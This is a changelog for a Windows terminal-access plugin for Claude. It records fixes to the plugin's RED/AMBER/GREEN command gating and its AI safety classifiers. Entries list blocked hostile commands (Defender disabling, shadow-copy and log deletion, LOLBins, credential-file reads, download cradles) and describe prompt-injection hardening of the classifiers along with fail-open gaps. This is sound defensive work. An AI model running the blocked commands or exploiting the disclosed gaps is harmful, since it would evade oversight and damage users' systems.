# Changelog

All notable changes to local-terminal-mcp.

The format loosely follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/). Versioning is [SemVer](https://semver.org/spec/v2.0.0.html).

---

## [1.12.2] — 2026-04-29

### Pass 46 adversarial review closeout (2026-04-29)
- **F1 (MEDIUM)** src/tools.ts → dist/tools.js: AMBER tier header comment still said "Forces dry_run=true with ToS warning" — contradicting all doc corrections from P42. Fixed to: "dry_run=true is the default (not server-enforced); a warning is added to the response." Dist rebuilt.
- **F2 (MEDIUM)** src/tools.ts → dist/tools.js, CLAUDE_CONTEXT.md, SECURITY.md: `data-destruction` slug (`vssadmin`, `wbadmin`, `wevtutil`, `ntdsutil`) was present in code (BLOCKED_PATTERNS) but entirely absent from docs and had no `BLOCKED_ALTERNATIVES` entry. Added BLOCKED_ALTERNATIVES entry to tools.ts; added `data-destruction` row to CLAUDE_CONTEXT.md RED category table; added to SECURITY.md additional-slugs list. Dist rebuilt.
- **F3 (LOW-MEDIUM)** src/tools.ts → dist/tools.js: `formatBlockedError()` lacked any ToS warning, unlike `formatAmberWarning()`. Added "Note: Repeated bypass attempts may violate the Terms of Service (forgerift.io/terms.html)." as a trailing line. Dist rebuilt.
- **F4 (LOW)** CLAUDE_CONTEXT.md: `get_system_info` tool description in the diagnostic workflow still read "last 50 lines" — misleading since `read_file` uses line ranges not tail-N. Updated to "lines 100-200 of [log file path]" with guidance on locating the tail without a `tail` binary.
- **F5 (LOW)** CLAUDE_CONTEXT.md: `run_command` GREEN example block contained PowerShell cmdlets (`Get-ChildItem`, `Get-Process`) that cannot run via the cmd.exe host. Removed or replaced with cmd.exe equivalents.
- **F6 (LOW)** CLAUDE_CONTEXT.md: GREEN-tier run_command description omitted that AI pipeline still runs when ANTHROPIC_API_KEY is configured. Added parenthetical disclosure.
- **F7 (LOW)** CLAUDE_CONTEXT.md: Memory/context prompt block had been truncated to a bare `>` with no content. Restored full memory workflow prompt text.

### Pass 45 adversarial review closeout (2026-04-29)
- **F1 (MEDIUM)** forgerift.io/index.html: AMBER tier description listed "package updates" as an AMBER example. Package install/update/remove operations are `pkg-mgr-destructive` HARD_BLOCKED (RED), not AMBER. Replaced with `<code>sed -i</code>`, which is a genuine AMBER pattern.
- **F2 (LOW)** forgerift.io/terms.html Schedule B.1: AMBER wording said commands "require explicit user confirmation" implying server-side enforcement. Replaced with accurate workflow-convention language matching README/FAQ/SECURITY.md: confirmed no session-state gate exists.

### Pass 44 adversarial review closeout (2026-04-29)
- **F1 (HIGH)** Restored truncated file tails in 6 files that were truncated mid-sentence since the P42 session. All git-tracked versions prior to P42 were complete; P42 Python edits preserved a truncated working-tree state. Restored: SECURITY.md (BYPASS_BINARIES paragraph body); README.md (License section + footer links); COMMANDS.md (final FAQ answer + closing line); CLAUDE_CONTEXT.md (memory prompt text after the `>` blockquote marker); .claude-plugin/CLAUDE.md (Behavioral Rule 6 body); forgerift.io/index.html (footer links + `</footer></body></html>` closing tags).
- **F2 (MEDIUM)** CLAUDE_CONTEXT.md: P43 missed two occurrences of `running processes` in the tool list (line ~56) and diagnostic prompt (line ~224). Updated to remove the false claim; added `(use run_command with tasklist)` parenthetical.
- **F3 (LOW)** SECURITY.md: Added clarification that `SAM`, `SYSTEM`, `SECURITY` sensitive-file patterns block any file whose basename ends in those literals (not only the registry hive files in `System32\\config`). No code change — documentation disclosure.
- **F4 (LOW)** README.md: Clarified that Layer 3 `PROCEED WITH CAUTION` warnings are also withheld until `dry_run=false`. No code change — documentation disclosure only.
- **F5 (LOW)** README.md: Added disclosure that `dry_run=true` preview calls also consume Anthropic API tokens — the recommended AMBER preview-then-execute flow charges twice. No code change.

### Pass 43 adversarial review closeout (2026-04-29)
- **F1 (HIGH)** CLAUDE_CONTEXT.md: AMBER section heading still read `### ⚠️ AMBER — Warning Required, \`dry_run\` Forced` and body still said `\`run_command\` forces \`dry_run=true\`...User must re-call`. Pass 42 had fixed the architecture bullet and the behavioral tip but missed this section. Fixed heading and body to match corrected language (default, not forced gate).
- **F2 (HIGH)** src/tools.ts → dist/tools.js: `formatAmberWarning()` runtime string still said `dry_run has been forced to true for safety.` — the most user-visible surface. Changed to `dry_run defaulted to true (the safe default) — the command was NOT executed.` Dist rebuilt.
- **F3 (MEDIUM-HIGH)** README.md: Two false claims corrected. (a) `the dry-run output is presented alongside the AI safety classification result` — actually the AI verdict is only included when \`dry_run=false\`; on dry-run preview only the AMBER warning is returned. Corrected to accurately describe when the AI result is surfaced. (b) `The failure reason is surfaced in the dry-run output` — API failure is logged internally, not returned to the caller on a dry-run call. Corrected.
- **F4 (MEDIUM)** src/tools.ts, README.md, MARKETPLACE_LISTING.md, COMMANDS.md: `get_system_info` tool description claimed to return `running processes` but the implementation only runs `ver`, `hostname`, `whoami`, `wmic logicaldisk`, `wmic OS` — no tasklist, no process list. Removed `running processes` from all descriptions; added parenthetical `(use run_command with tasklist to see running processes)` in tool desc and README. Dist rebuilt.
- **F5 (MEDIUM)** COMMANDS.md, .claude-plugin/CLAUDE.md, README.md, faq.md: Pass 42 (F4) added plain-pipe disclosure only to SECURITY.md and CLAUDE_CONTEXT.md; missed these four docs. Added `plain \`|\` piping is NOT blocked — each segment checked independently` note to COMMANDS.md chaining section, .claude-plugin/CLAUDE.md command-chaining rule, README.md RED examples block, and faq.md security model bullet.
- **F6 (LOW-MEDIUM)** README.md, faq.md: Both disclosed AI fail-open behavior (`without an API key the AI classification layers are skipped entirely`) but neither mentioned the `LAYER_STRICT_MODE=true` opt-in for fail-closed behavior. MARKETPLACE_LISTING.md and index.html already had it (added in Pass 42). Added the operator override note to both.

### Pass 42 adversarial review closeout (2026-04-29)
- **F1 (HIGH)** SECURITY.md, README.md, CLAUDE_CONTEXT.md, .claude-plugin/CLAUDE.md, COMMANDS.md, MARKETPLACE_LISTING.md, index.html, faq.md: corrected AMBER tier documentation. Changed all claims that `dry_run=true` is "forced" or that a second call is "required" to accurately state that `dry_run=true` is the **default** and the recommended two-call workflow is enforced by Claude's behavior, not a server-side gate (the plugin has no session state to enforce it).
- **F2 (MEDIUM-HIGH)** MARKETPLACE_LISTING.md, index.html: added AI layer fail-open disclosure — without an `ANTHROPIC_API_KEY` (or on API failure), AI safety layers are silently skipped and the plugin falls back to static RED blocks plus AMBER warnings. `LAYER_STRICT_MODE=true` documented as the fail-closed option. README.md already disclosed this in two places.
- **F3 (MEDIUM)** index.html: corrected "newline injection. No override, no flag, no escape" — changed to "newline injection (each line checked independently against the block list)" to accurately describe the multi-line split-and-check behavior rather than implying a monolithic injection block.
- **F4 (LOW-MEDIUM)** SECURITY.md, CLAUDE_CONTEXT.md: added plain-pipe disclosure. Chaining blocks cover `&&`, `||`, `;`, `&`, pipe-to-shell — plain `|` piping (e.g. `dir | findstr text`) is NOT blocked; each segment is checked independently. Added note to both docs.
- **F5 (LOW-MEDIUM)** MARKETPLACE_LISTING.md, README.md: added audit log persistence note — the audit log persists after uninstall since Claude Desktop may not delete the extension's install directory automatically.
- **F6 (MEDIUM)** src/tools.ts → dist/tools.js: added secret-warning to `run_command` `justification` parameter description: "Sent to Anthropic's API for safety classification if an API key is configured — do not include secrets, passwords, tokens, or sensitive data." NUL bytes stripped from src/audit.ts, src/config.ts, src/tools.ts before rebuild. dist rebuilt clean.

### Pass 40 final verification (2026-04-29)
- SECURITY.md, README.md: added `.ppk` to sensitive-file extension lists (code already blocked it via SENSITIVE_FILE_PATTERNS since Pass 37; docs were incomplete)
- forgerift.io/faq.md: added `.ppk` to sensitive-file extension list for consistency

### Pass 39 holistic review fixes (2026-04-29)
- README.md, SECURITY.md, CLAUDE_CONTEXT.md, .claude-plugin/CLAUDE.md, COMMANDS.md: corrected `xargs` from AMBER to RED — it is hard-blocked under `recursive-file-deletion` (HARD_BLOCKED_PATTERNS line 809); `find -exec` remains AMBER
- src/tools.ts: removed dead `xargs` entry from AMBER_PATTERNS (HARD_BLOCKED fires first, making the AMBER entry unreachable); dist/ rebuilt
- .env.example: BYPASS_BINARIES example changed from `pip:pkg-install` (BLOCKED_PATTERNS slug, bypass has no effect) to `winget:pkg-mgr-destructive` (real HARD_BLOCKED slug)
- README.md: corrected package.json `engines` claim — README said "we do not enforce a minimum version" but package.json has `engines: { node: ">=18" }`; clarified this applies to source-build tooling, not the .mcpb runtime
- forgerift.io/index.html: reworded "Structured tools never spawn a shell" — `get_system_info` internally runs wmic via execSync; corrected to clarify structured tools execute fixed allowlisted operations without passing user command text through the security classifier

### Pass 38 legal/compliance fixes (2026-04-29)
- forgerift.io/faq.md: corrected "Both plugins require Claude Desktop (Windows)" — local-terminal-mcp is Windows-only; vps-control-mcp works from any OS running Claude Desktop (Windows or macOS)
- forgerift.io/faq.md: corrected audit-log uninstall claim — FAQ said log "is removed when Claude Desktop deletes the extension on uninstall" (contradicted TROUBLESHOOTING.md); corrected to: Claude Desktop may not auto-delete; user should manually delete install directory to remove all traces

### Pass 37 security-claim accuracy fixes (2026-04-29)
- src/tools.ts: `run_npm_command` tool description and parameter description now include `ls` (regex already accepted it); dist/ rebuilt
- src/tools.ts: added `/\.ppk$/i` to SENSITIVE_FILE_PATTERNS (PuTTY private key files); dist/ rebuilt
- CLAUDE_CONTEXT.md: removed `wmic read queries` from GREEN examples (all wmic calls are RED `code-exec` blocked)
- CLAUDE_CONTEXT.md: `direct-db` row now describes actual blocked trigger (SQL write keywords) instead of implying binaries are blocked
- CLAUDE_CONTEXT.md: commit-message false-positive example fixed to actually-blocked keywords (`DROP`, `DELETE`, `TRUNCATE`, `ALTER`, `CREATE`, `GRANT`, `REVOKE`); removed `SELECT` and `INSERT` which are not blocked
- CLAUDE_CONTEXT.md: `env-manip` row: removed "(machine-scope)" qualifier; pattern blocks all scopes
- CLAUDE_CONTEXT.md: `info-leak` row split into `info-leak` (command-level credential enumeration) and `sensitive-file` (file-protection layer) to accurately describe two distinct mechanisms
- CLAUDE_CONTEXT.md: `BYPASS_BINARIES` example updated to use real HARD_BLOCKED slugs (`sensitive-path-write`, `pkg-mgr-destructive`); added note that bypass only applies to HARD_BLOCKED_PATTERNS categories
- COMMANDS.md: `env-manip` section: removed "with Machine scope" qualifier; blocked at all scopes (Process/User/Machine)
- TROUBLESHOOTING.md: `chaining` category description corrected: plain `|` is NOT blocked; only pipe-to-shell (`| cmd`, `| powershell`, `| bash`) is blocked

### Pass 36 doc-fix closeout (2026-04-29)
- TROUBLESHOOTING.md: corrected RED-block error format example to actual emitted format (`⛔ BLOCKED [file-delete]`); replaced fictional `credential-access` category with real `info-leak` slug; aligned curl health-check command to `curl -I` (consistent with README.md)
- CLAUDE_CONTEXT.md: updated runtime slug note to describe actual error format (`⛔ BLOCKED [<slug>]`) instead of fictional `BLOCKED [RED] category=<slug>` syntax
- SECURITY.md: updated error format reference from `BLOCKED [RED] category=<slug>` to `⛔ BLOCKED [<slug>]`
- COMMANDS.md: updated RED section note to use actual `⛔ BLOCKED [<slug>]` error format
- .claude-plugin/CLAUDE.md: added `get_system_info` to structured-tool preference list (was missing; 6 of 8 tools listed previously)
- src/tools.ts: npm error message now lists `ls` in the Allowed sub-commands (regex already accepted it; message was inconsistent); dist/ rebuilt
- forgerift.io/terms.html: changed "approximately 27 categories" to "27 categories" (consistent with README.md, MARKETPLACE_LISTING.md, SECURITY.md, faq.md)

### Packaging closeout (2026-04-29)
- `LAYER_STRICT_MODE` default corrected to fail-open (`=== 'true'`) — matches documented behavior
- `dist/` rebuilt from source; version string now correctly reports 1.12.2
- README.md image links updated to absolute GitHub raw URLs
- `.mcpbignore` updated: TROUBLESHOOTING.md, COMMANDS.md, CREDITS.md now ship in archive
- CHANGELOG date updated to reflect actual release close date
- License validation endpoint migrated from `payments.104-131-74-82.sslip.io` to `payments.forgerift.io` (same server, clean vanity hostname via Cloudflare DNS)

### Chore - S72 Install-Model Documentation Rewrite (S71 BLOCKER closure)

- **F-S71-1** - Rewrote README.md install section for the .mcpb model. Removed all NSSM / Windows Service / setup.ps1 / MCP_PORT / MCP_AUTH_TOKEN references. New Install, Update/Uninstall, Configuration (user_config keys), and Logs sections describe the Claude Desktop extension flow. Infrastructure table row updated: Localhost-only -> stdio transport.
- **F-S71-2** - Pattern count corrected in README.md: 450+ -> 140+ (authoritative count: 140 entries in HARD_BLOCKED_PATTERNS, presented as 140+ per round-number policy).
- **F-S71-3** - Rewrote MARKETPLACE_LISTING.md for the .mcpb model. Pattern count 450+ -> 140+. Windows Service infrastructure paragraph replaced with Lifecycle paragraph (stdio, Claude Desktop managed). Quick Start replaced with .mcpb install flow. Configuration table updated to user_config keys (lt_license_key, anthropic_api_key). Requirements updated (no Node.js / PowerShell admin).
- **F-S71-4** - Rewrote CLAUDE_CONTEXT.md install/troubleshooting sections. Architecture paragraph updated for stdio transport (no NSSM, no MCP_AUTH_TOKEN, no port). Stale Common Gotchas (auth token mismatch, claude_desktop_config.json location, service won't start, port conflict, NSSM download) replaced with .mcpb troubleshooting items (extension reset, license key, Anthropic API key, audit log location, Defender/AV). NSSM Service Commands section removed. Key Configuration Variables table split: user_config keys at top, advanced env vars below (removed MCP_AUTH_TOKEN, MCP_PORT, MCP_LOG_DIR). Log Files table: removed service-out.log and service-err.log.
- **F-S71-6** - .mcpbignore: added node_modules/**/test*/ and node_modules/**/*.test.js / *.spec.js exclusions to trim transitive test files from the shipped archive.
- *(F-S71-5 was reviewed and closed without changes — investigation confirmed no documentation edits were required.)*
- **Version bump** - 1.12.1 -> 1.12.2 (patch-level docs-only; no security logic changes). .mcpb archive rebuilt and re-pinned.

---

### Pass 30 adversarial review closeout (2026-04-29)
- Fixed "in-process" architectural claim → "child process spawned by Claude Desktop" (SECURITY.md, faq.md)
- Fixed "no port opened — inbound or outbound" → accurate inbound-only qualifier + outbound HTTPS flows disclosed (SECURITY.md)
- Added fail-open paragraph for AI layer to SECURITY.md §GREEN Tier: explains `LAYER_STRICT_MODE` default, fallback, and rationale
- Fixed "no network socket, no port exposure" → "no inbound network socket, no inbound port exposure" (MARKETPLACE_LISTING.md)
- Added Anthropic non-affiliation disclaimer to MARKETPLACE_LISTING.md top section
- Fixed consumer-law misrepresentation: "No refunds after trial ends" → accurate exceptions sentence (README.md, MARKETPLACE_LISTING.md, forgerift.io/index.html)
- Fixed terms.html §4.1 "one outbound call" → discloses both license-validation and optional Anthropic API flows
- Added "package removal (choco uninstall/winget uninstall)" to .claude-plugin/CLAUDE.md blocked-categories list (was listing 26 of 27 categories)


### Pass 31 adversarial review closeout (2026-04-29)
- Fixed CLAUDE_CONTEXT.md: `run_command` uses cmd.exe (not PowerShell) — corrected shell context, syntax examples, session description, and backslash-escaping section
- Fixed three surfaces still claiming "in-process" architecture: manifest.json `long_description`, README.md Infrastructure Hardening table, forgerift.io/index.html kicker
- Fixed per-tool timeout misrepresentation: updated SECURITY.md, README.md, and terms.html §B.1 from blanket "30s" to per-tool matrix (30s for run_command/run_git_command, 60s for run_npm_command)
- Updated SECURITY.md categories list from user-friendly slugs to the 27 actual runtime slugs (the exact `category=` values emitted in `BLOCKED [RED]` error messages)
- Added runtime slug mapping note to CLAUDE_CONTEXT.md RED category table and COMMANDS.md
- Fixed terms.html §8: replaced vps-control-mcp-specific `run_approved_command` example with local-terminal-mcp-appropriate AMBER re-invocation example
- Added BSD-2-Clause to CREDITS.md license summary (dotenv dependency)
- Removed duplicate Windows Defender exclusion sentence from CLAUDE_CONTEXT.md
- Deleted setup.ps1 and uninstall.ps1 from repo (deprecated v1.10.x scripts; already excluded from .mcpb archive; no live doc references)
- P31-5 (pattern count 140 vs 142): investigated — actual count verified as 140 entries (not 142 as originally noted); corrected here


### Pass 32 adversarial review closeout (2026-04-29)
- Fixed .claude-plugin/CLAUDE.md: "30-second hard timeout" → per-tool matrix (30s run_command/run_git_command, 60s run_npm_command)
- Fixed forgerift.io/faq.md GREEN tier: "30-second hard timeout cap" → per-tool matrix
- Added id="section-6-5" anchor to terms.html §6.5 heading (fixes dead fragment link from index.html refund disclosure)
- Corrected CHANGELOG pattern count from "actual: 142" to "actual: 140" (re-verified against src/tools.ts)
- Confirmed: run_powershell does not exist as a plugin tool; the 8 tools are run_command, run_git_command, run_npm_command, list_directory, read_file, get_system_info, find_files, search_file


### Pass 33 adversarial review closeout (2026-04-29)
- Fixed SECURITY.md: removed exact from 27-slug claim; clarified these are HARD_BLOCKED_PATTERNS slugs and BLOCKED_PATTERNS also surfaces additional category= values in error messages
- Fixed src/tools.ts header comment: 100+ across 20 categories -> 140+ across 27 hard-block categories (rebuilt dist/)
- Fixed README.md + TROUBLESHOOTING.md: curl/Invoke-WebRequest health-check commands now say run in a separate Command Prompt or PowerShell window, not through Claude (both are RED-blocked)
- Renamed GETTING_STARTED.md Step 4 to Optional: Prime Claude with plugin context (removes false implication it is required setup)
- Fixed CLAUDE_CONTEXT.md Layer 2: was flags commands for AI review; now correctly describes AMBER as forcing dry_run=true with user re-confirmation, independent of AI
- Fixed SECURITY.md v1.12.1 row: removed stale typescript to devDependencies item; aligned with CHANGELOG
- Fixed README.md Founder Cohort pricing: standard-individual price -> bundle pricing equals the regular Individual plan rate
- Fixed README.md double-space typo


### Pass 34 adversarial review closeout (2026-04-29)
- P34-1 through P34-5, P34-7: All five CRITICAL truncation findings and NUL-byte finding were FALSE -- files verified complete and clean via tail check
- Fixed SECURITY.md: mojibake (triple-encoded em-dash) in the HARD_BLOCKED slug paragraph -- replaced corrupted bytes with proper UTF-8 em-dash
- Fixed terms.html Schedule B.1: npm install (not available via run_npm_command) replaced with npm audit / git log as timeout examples
- Fixed COMMANDS.md: removed exact from slug claim; clarified 27 are HARD_BLOCKED_PATTERNS slugs, BLOCKED_PATTERNS surfaces additional ones
- Fixed forgerift.io/faq.md: Founder Cohort pricing parenthetical aligned with README phrasing
- Fixed forgerift.io/index.html: corrected over-indented Supabase bearer token li element


### Pass 35 adversarial review closeout (2026-04-29)
- P35-1/P35-2: All truncation and NUL-byte findings were false -- all files verified complete and clean
- Fixed forgerift.io/index.html: meta description and security section no-shell claim corrected (run_command does use cmd.exe)
- Fixed SECURITY.md v1.11.0 row: auth.ts retired is stale; clarified Express/HTTP auth retired, auth.ts re-introduced in v1.12.0
- Fixed README.md: curl health-check parenthetical was inside code span; moved outside backticks
- Stripped UTF-8 BOM from src/audit.ts, src/config.ts, and SECURITY.md
- Removed stale setup.ps1 and uninstall.ps1 entries from .mcpbignore (files deleted in Pass 31)
- Bumped Last updated to 2026-04-29 in CREDITS.md, faq.md, terms.html, cookies.html, privacy.html
- Added Version field to @anthropic-ai/sdk entry in CREDITS.md


## [1.12.1] — 2026-04-27

### Chore — S70 Pre-Submission Cleanup

- **B-1** — Added `prepack` script: fails with exit 1 if any `.orig`/`.bak`/`.rej`/`.swp`/`_HEAD`/`_BRANCH` files are untracked in `src/` at pack time.
- **B-4** — Fixed `marketplace.json` and `manifest.json` descriptions: updated stale pattern-count strings from `120+` to `80+` in marketplace.json/manifest.json (actual count at that time: 82; transport had already migrated to stdio in v1.11.0). Replaced `Runs as a Windows Service` with `.mcpb extension for Claude Desktop`.
- **B-5** — Rewrote `TROUBLESHOOTING.md` for the `.mcpb` install model. Removed all NSSM / `setup.ps1` references. New sections: Extension won't install, License key issues, Tools don't appear, AMBER dry-run gate, RED block error messages, Audit log location (`logs\audit.log` in the extension's install directory), Updating via Settings > Extensions, Uninstalling via Settings > Extensions > Remove.
- **D-1** — License sweep: removed all BUSL 1.1 / Business Source License references from `README.md`, `MARKETPLACE_LISTING.md`, `CLAUDE_CONTEXT.md`, `manifest.json` (new file from v1.11.0 packaging commit). License stays MIT. S69 audit prompt's BUSL reference was hallucinated; no BUSL adoption occurred. Documented here so future passes do not re-investigate.
- **Version bump** — 1.12.0 —> 1.12.1 (patch-level cleanup; no security logic changes).

---

## [1.12.0] — 2026-04-27

### Changed
- Internal version increment prior to v1.12.1 security patch release.

---
## [1.11.0] — 2026-04-26

### Transport: SSE/HTTP -> stdio (required for .mcpb packaging)

- **Transport refactor** -- src/index.ts rewritten to use StdioServerTransport (MCP SDK). Removed Express HTTP server, SSE transport, CORS middleware, and per-request Bearer token auth. stdio transport is spawned directly by Claude Desktop -- no network socket is exposed, so network-layer auth is not applicable.
- **auth.ts retired** -- validateAuth and timingSafeEqual token comparison removed. Security model now enforced entirely at the tool layer (RED/AMBER/GREEN three-tier model in tools.ts). auth.ts retained as a documented stub to preserve the security rationale.
- **config.ts simplified** -- PORT, AUTH_TOKEN, RATE_LIMIT_PER_MIN, and validateConfig() removed (no longer relevant without HTTP transport). AUDIT_MAX_SIZE_MB export retained for compatibility.
- **express removed** -- express and @types/express removed from package.json. Zero network-facing dependencies remain.
- **F-LT-51 updated** -- Security test updated to verify: auth.ts does not import express, index.ts uses StdioServerTransport, index.ts does not use SSEServerTransport. All 421 tests pass.
- All security logic in tools.ts and audit.ts unchanged.


## [1.10.5] — 2026-04-24

### Security — H-1 / H-2 (S62 parse-failure parity fix)

- **H-1** — Layer 2 (Haiku classifier) response parsing: replaced `lastLine`-only scan with all-lines BLOCKED-priority scan. Any line starting with `BLOCKED` in the classifier response now correctly triggers a block, regardless of trailing content or extra lines added by the model. Closes parse-failure false-passes when the classifier prefaced its verdict with explanatory text.
- **H-2** — Layer 3 (Sonnet safety board) response parsing: same fix applied. All-lines scan with priority order BLOCKED > PROCEED WITH CAUTION > PASS. Adds response excerpt to the `console.warn` on unexpected format for easier debugging.

## [1.10.4] — 2026-04-23

### Security - F-OP-80 / F-OP-82 / F-OP-83 / F-OP-84 / F-OP-85 (S65 closure)

#### Matcher fixes
- **F-OP-80** - `SENSITIVE_PATH_WIN` regex at `src/tools.ts:639` anchored: `^(?:\/?[A-Za-z]:)?\/(?:windows|system32|syswow64|program files|programdata)(?=[\/\\]|$)`. Leading `/` now required (with optional drive-letter prefix) and trailing separator or EOL enforced via lookahead. Closes a v1.10.3 regression where benign CWD-relative filenames like `windows-update.log`, `system32.bak`, `programdata-export.zip` incorrectly matched the regex as prefix and triggered `sensitive-path-write` blocks.
- **F-OP-82** - `src/tools.ts:917-935` in the D10 PowerShell matcher loop: `nextVal()` now returns `undefined` when the fallback `rest[j+1]` starts with `-` (flag token), and the three param matchers `continue` the loop on undef instead of `break`ing. Closes a v1.10.3 F-OP-72 derivative gap where `Set-Content -Path: -Value x -LiteralPath /etc/passwd` had `-Value` absorbed as dest, skipping the sensitivity check on the real target.

#### Documentation
- **F-OP-83** - SECURITY.md D10 subsection now points at `BYPASS_BINARIES` as the documented operator override for the F-OP-79 UNC fail-closed guard and the broader sensitive-path class.

#### Supply-chain hygiene
- **F-OP-84** - `.githooks/pre-commit` enforces refusal of merge-conflict artifacts (`_BRANCH`/`_HEAD`/`_LOCAL`/`_REMOTE`/`_BASE`/`_MERGED`/`_YOURS`/`_THEIRS.ts`) plus backup/editor files (`.orig`, `.orig.N`, `.rej`, `.bak`, `.swp`, `*~`, `.env.test`). `package.json` `prepare` script wires `core.hooksPath` to `.githooks` automatically on `npm install`, so the guard activates on every fresh clone.
- **F-OP-85** - `.gitignore` expanded from 3 merge-artifact patterns (`_BRANCH`, `_HEAD`, `.orig`) to the full class matched by the pre-commit hook.

#### Testing
- `bypass-corpus.test.ts` gains 12 new tests (7 for F-OP-80, 5 for F-OP-82). Full LT suite now passes **419/419**.

---

## [1.10.3] — 2026-04-22

### Security — F-OP-72 / F-OP-74 / F-OP-75

- **F-OP-72** — D10 PowerShell sensitive-path write matcher: extended to cover `Set-Content`, `Out-File`, `Add-Content`, `Export-Csv`, `Export-Clixml` with destination-argument extraction. Closes gap where PowerShell cmdlet writes to sensitive paths bypassed the D10 argv matcher (which previously matched only POSIX-style `cp`/`mv`/`tee`).
- **F-OP-74** — UNC path write guard: `\\server\share\...` paths canonicalized before sensitivity check. Fail-closed: unresolvable UNC roots treated as sensitive.
- **F-OP-75** — Tilde expansion in write destinations: `~/sensitive-path` now resolved against known sensitive prefix list before sensitivity gate.

---

## [1.10.2] — 2026-04-22

### Security — F-OP-68 / F-OP-69

- **F-OP-68** — `SENSITIVE_PATH_WIN` regex tightened: Windows system path detection now requires leading slash or drive-letter prefix, preventing benign filenames containing "system32" or "windows" as substrings from triggering false-positive blocks.
- **F-OP-69** — Redirect operator destination extraction hardened: `>` and `>>` target captured after quote normalization and env-var stripping, so `echo x > "$APPDATA\passwd"` correctly identified as a sensitive write.

---

## [1.10.1] — 2026-04-22

### Security — F-OP-66

- **F-OP-66** — Layer 1 BLOCKED tier hardening: `BYPASS_BINARIES` env var added. Operators may demote specific `<binary>:<category>` pairs from hard-block to AI-reviewed (Layer 2/3) for legitimate admin workflows. Every bypass is logged as `[SECURITY-BYPASS]` in the audit stream. Documented in `SECURITY.md`.

---

## [1.10.0] — 2026-04-22

### Security — F-OP-62 / F-OP-63 / F-OP-64 (BLOCKED tier introduction)

- **F-OP-62** — BLOCKED tier (Layer 1 hard-block) introduced as a new security tier above AMBER. Commands matching BLOCKED patterns return a structured error immediately without entering Layer 2/3 AI classification. Prevents prompt-injection attacks that attempt to manipulate the Haiku/Sonnet classifiers.
- **F-OP-63** — `HARD_BLOCKED_PATTERNS` array seeded with the highest-risk categories from the existing BLOCKED_PATTERNS list: shell invocation, privilege escalation, credential theft, data exfiltration, persistence mechanisms.
- **F-OP-64** — `ANTHROPIC_API_KEY` now validated at startup; Layer 2/3 classification skipped (fail-open or fail-closed per `LAYER_STRICT_MODE`) when key is absent. `LAYER3_MODEL` env var added for operator control of the safety board model.

---

## [1.9.6] — 2026-04-22

### Security — H18: Per-binary bypass allowlist

- **H18** — `BYPASS_BINARIES` env var allows admins to demote specific binary+category pairs from hard-block (Layer 1) to AI-reviewed (L2/L3 pipeline); disabled by default; every bypass is logged with `[SECURITY-BYPASS]` prefix; Windows-aware (supports `git`, `winget`, `choco`, etc.)
- **Legal** — Added Disclaimer of Warranties and Limitation of Liability section to SECURITY.md; explicit acknowledgement requirements for `BYPASS_BINARIES` users

---


## [1.9.5] — 2026-04-22

### Security — D10, M7, H17, H20, M8

#### Hard-block additions to `HARD_BLOCKED_PATTERNS` (Layer 1)

- **D10** — Destination-path write protection (Windows + cross-platform): argv-aware matcher blocks `copy`/`move`/`xcopy`/`robocopy`/`cp`/`mv`/`install` writing to `C:\Windows`, `System32`, `SysWOW64`, `Program Files`, `ProgramData`, and Unix paths `/etc`, `/root`, `/usr/bin`, etc.; also blocks `tee` and `dd of=<sensitive>`
- **M7** — Redirect path traversal (Windows + cross-platform): blocks `>>?` redirections to `..\` or `../` relative escapes, Windows OS paths (`C:\Windows\System32` etc.), and Unix OS paths (`/etc`, `/root`, `/boot`, etc.)

#### AI classifier enhancements (Layer 2 + Layer 3)

- **H17 / M8** — `commandRiskMeta()` helper: detects chain operators (`|`, `&&`, `||`, `;`, `&`) and scores a risk level (`low`/`medium`/`high`) with Windows-aware high-risk patterns (`schtasks`, `netsh`, `icacls`, `Invoke-WebRequest`, PowerShell download cradles); risk metadata injected into both L2 and L3 prompts; chained commands trigger a `CHAIN WARNING` directive
- **H20** — L3 safety-board now uses `LAYER3_MODEL` (default `claude-sonnet-4-6`) instead of Haiku; overridable via `LAYER3_MODEL` env var

---

## [1.9.4] — 2026-04-22

### Security — Phase 3 hardening (H4–H15 + M4–M6 + M12–M13)

#### Hard-block additions to `HARD_BLOCKED_PATTERNS` (Layer 1)

- **H4** — Registry query/export: `reg query`, `reg export`, `reg compare`, `reg copy`, `reg save`
- **H5** — Additional Windows LOLBins: `installutil`, `odbcconf`, `ieexec`, `pcalua`, `infdefaultinstall`, `mavinject`, `presentationhost`, `syncappvpublishingserver`, `appvlp`
- **H10** — Defender/EDR disable: `Set-MpPreference -Disable*`, `Disable-WindowsOptionalFeature Windows-Defender`, `net/sc stop WinDefend/MSSense`, `sc delete sense`, Linux EDR stop (clamav, auditd, falco, osquery)
- **H11** — .NET Reflection assembly loading: `[Reflection.Assembly]::Load*`, `[System.Reflection.Assembly]::Load*`, `[AppDomain]::CurrentDomain.Load`
- **H12** — `xargs` fan-out (available via Git Bash / WSL on Windows)
- **H15** — Windows package managers: `winget`, `choco`, `scoop`, `npm -g`, `pip`, `gem`, `cargo install`
- **M4** — `wmic` expansion: shadow-copy delete, service stop/start, OS shutdown via WMI
- **M5** — COM-exec expansion: `microsoft.xmlhttp`, `msxml2.xmlhttp`, `schedule.service`, `adodb.stream/connection`
- **M6** — `net` subcommand expansion: `net share/session/use/view/accounts/config/file/statistics/start/stop`
- **M12** — `start /b` background process detachment
- **M13** — Git history-rewrite: `git reset --hard`, `git clean -f`, `git push --force/--mirror`, `git filter-branch/filter-repo`

#### Architecture

- `checkBlocked` now also calls `checkHardBlocked` synchronously so all `HARD_BLOCKED_PATTERNS` are enforced in every code path, not only when the async three-layer pipeline runs.

#### Tests

- 53 new Phase 3 bypass-corpus tests added (319 total, 319 pass).

## [1.9.3] — 2026-04-22

### Security (S61 Phase 2 — architectural hardening)
- C11/D4: Hardened Layer 2 + Layer 3 prompts against injection — command wrapped in nonce-tagged `<cmd nonce="…">` delimiter; anti-injection clause added to both user and system prompts; classifiers now require nonce echo on PASS verdicts; default-BLOCKED on any unexpected response format; post-classifier Layer 1 re-check after every L2 PASS so a forged PASS cannot bypass static patterns (`tools.ts`)
- C12/D6: Fail-closed on Layer 2 + Layer 3 errors — missing `ANTHROPIC_API_KEY` or any API exception now returns BLOCKED instead of silently passing; opt-out via `LAYER_STRICT_MODE=false` env var; all skip/error events logged at WARN/ERROR severity (`tools.ts`)
- C13/D1: Removed `isElevatedRisk` branch — Layer 2 and Layer 3 now always run in parallel on every blocked-tier command regardless of caller-assigned risk level (`tools.ts`)
